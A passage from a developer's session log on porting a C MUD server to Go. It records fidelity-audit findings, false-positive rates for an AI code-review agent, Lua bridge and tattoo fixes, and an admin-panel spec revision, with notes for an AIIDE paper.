- **Silent drift as a bug category:** The classSpells audit revealed that Go tables had accumulated entries that don't exist in C source — extra psionic spells, wrong levels. Nobody noticed because the code compiles and runs. Static analysis can't catch this because it operates on a single codebase. Fidelity audit — comparing port against authoritative source — is the only mechanism. This is a natural task for AI agents with cross-codebase access, and a novel contribution for AIIDE.

- **False positive teaching loop:** Reek's FPR improved from 1.6% (toolchain bulk) through 9.5% (entity analysis) to 13.0% (deeper architectural), then stabilized at 0-12.5% for targeted crawls. Daeron rejects with explanation, which functionally teaches Reek what's noise. The FPR is trending slightly up as Reek tackles harder analysis — expected and healthy. The weekly FPR of 4.3% across 201 findings is well below the 30% "good reek" threshold.

- **The GroupGain bug is the paper's best example.** It's a logic bug that requires understanding game mechanics (group XP distribution), code flow (NewNamedCombatant → PerformGroupGain → IsNPC guard), and port context (stub IsNPC always returning true). No static analysis tool catches this. No unit test catches this without understanding the game. Reek caught it by tracing the code path and asking "does this make sense?" That's the kind of reasoning the paper should highlight.

## 2026-05-13 [SESSION] — Port Completion WP4-WP6

Evening session. Finished the remaining workpackages from the port-completion-workplan.

### Changes
- WP5b: Lua follow/mount — implemented via ScriptableWorld.SetFollower/MountPlayer/DismountPlayer
- WP5d: Lua carry-weight — implemented via ScriptableWorld.CanCarryObject
- WP5e: Clan channel — filters by ClanID instead of broadcasting to all players
- WP4: use_tattoo — skull summon + spell casting, correct C tattoo constants
- WP4: do_gen_write — writes reports to misc/bugs|typos|ideas|todo files
- WP6: Race help text — 8 entries from C constants.c wired into help system

### Key observations
1. **ScriptableWorld interface was already complete.** The Lua stubs for follow/mount/carry-weight all had corresponding methods on ScriptableWorld that were already implemented by BRENDA's earlier work. The gap was just the Lua→ScriptableWorld bridge — extracting names from Lua tables and calling the interface methods. This is a pattern: interface definition ahead of implementation creates clean wiring points.

2. **Tattoo constants were wrong in Go.** The original Go port used `1 + iota` which gave wrong values and invented tattoo types (Cobra, Wolf, Bear, etc.) that don't exist in C. The C source has TATTOO_DRAGON=1 through TATTOO_OWL=17. This is another example of silent drift — the code compiled and ran, but the tattoo system would have given wrong bonuses. Fidelity audit caught it.

3. **Import cycle avoidance is architectural.** The spells package uses `interface{}` for the world parameter to avoid circular imports (spells→game). The game package can import spells (game→spells is safe). This design decision enables the tattoo use_tattoo to call spells.Cast directly.

4. **File I/O for player reports is trivial but important.** The C code writes bug/typo/idea/todo reports to flat files. The Go stub just printed "Thanks!" without writing anything. Players expected their reports to be saved. This is the kind of "works but doesn't work" bug that erodes player trust.

### Paper-relevant
- The tattoo constant drift is evidence that port fidelity degrades silently over time. Without periodic cross-reference against the C source, wrong constants accumulate. This argues for automated fidelity checking as part of the CI pipeline.
- The ScriptableWorld bridge pattern (interface defined → stubs created → implementations wired) is a clean example of incremental system completion that could be documented as a methodology.

---

## 2026-05-13 [SESSION] — WP5c Complete + Admin Panel Spec Revision

### WP5c: Lua item_check — Port Complete

Final work package implemented. The `item_check()` Lua function now queries the shop system instead of always returning false.

**Implementation:**
- `ScriptableWorld.ShopBuysType(mobVNum, itemType)` — new interface method
- `World.ShopBuysType()` — looks up shop by keeper VNum, calls `WillBuyType()`
- `luaItemCheck` rewritten from stub to real implementation (scripts.c:717-753)
- 3 test cases passing: weapon match, staff no-match, no-shop mob

**Port status: COMPLETE.** 84,500+ lines Go, 321 files, 17 test packages green. 113 spells, zero stubs. All WP1-WP6 done.

### Admin Panel Spec Revision

Rewrote PLAN-web-admin-architecture.md against codebase reality. Original spec (BRENDA/Opus, 2026-04-24) was written against hypotheticals that don't match the actual server.

**Key corrections:**
- Single binary, single port (4350), `/admin/` prefix — not separate 8080/8081
- `net/http` + `ServeMux` routing — not gorilla/mux or chi
- `sync.RWMutex` on World — not SnapshotManager/atomic.Pointer
- Existing middleware wired (auth, CORS, security, audit, rate limiter) — not built from scratch
- AI systems already built — Phase 6 surfaces existing data, doesn't build infrastructure
- Zero new Go dependencies for backend

**New phase ordering:**
0. Admin API Foundation (pkg/admin/ router, role JWT, first endpoint)
1. React SPA Scaffold
2. Web Terminal Tab
3. Read-Only Viewers
4. Game Editors (biggest phase)
5. Operations Panel
6. AI & Research Panel
7. Polish

### Paper-relevant
- The port completion is a milestone for the AIIDE paper. The full C→Go port (73,000 lines C → 84,500 lines Go) is now done. The methodology chapter can reference the complete port as the substrate for the AI agent experiment.
- The admin panel spec revision is evidence of "spec drift" — planning documents written against hypotheticals diverge from reality over time. This is a general finding for software engineering with AI assistance: specs need periodic reality-checking against the actual codebase.
